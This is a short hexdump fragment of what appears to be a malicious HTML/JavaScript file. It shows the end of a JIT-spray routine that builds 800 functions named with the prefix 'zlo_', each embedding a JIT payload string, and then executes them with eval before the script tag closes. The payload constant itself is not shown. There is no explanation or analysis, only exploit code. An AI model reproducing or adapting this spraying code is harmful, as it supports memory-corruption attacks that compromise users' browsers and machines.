00004400  6c 3d 22 7a 6c 6f 5f 22  3b 0d 0a 20 20 20 20 20  |l="zlo_";..     |
00004410  0d 0a 66 6f 72 20 28 76  61 72 20 69 3d 31 3b 69  |..for (var i=1;i|
00004420  3c 38 30 30 3b 69 2b 2b  29 0d 0a 7b 0d 0a 20 20  |<800;i++)..{..  |
00004430  20 20 53 50 52 41 59 2b  3d 22 66 75 6e 63 74 69  |  SPRAY+="functi|
00004440  6f 6e 20 22 2b 7a 6c 2b  69 2b 22 28 29 22 2b 4a  |on "+zl+i+"()"+J|
00004450  49 54 2b 22 20 22 2b 7a  6c 2b 69 2b 22 28 29 3b  |IT+" "+zl+i+"();|
00004460  22 3b 0d 0a 7d 0d 0a 20  0d 0a 65 76 61 6c 28 53  |";..}.. ..eval(S|
00004470  50 52 41 59 29 3b 0d 0a  20 0d 0a 3c 2f 73 63 72  |PRAY);.. ..</scr|
00004480  69 70 74 3e                                       |ipt>|
00004484
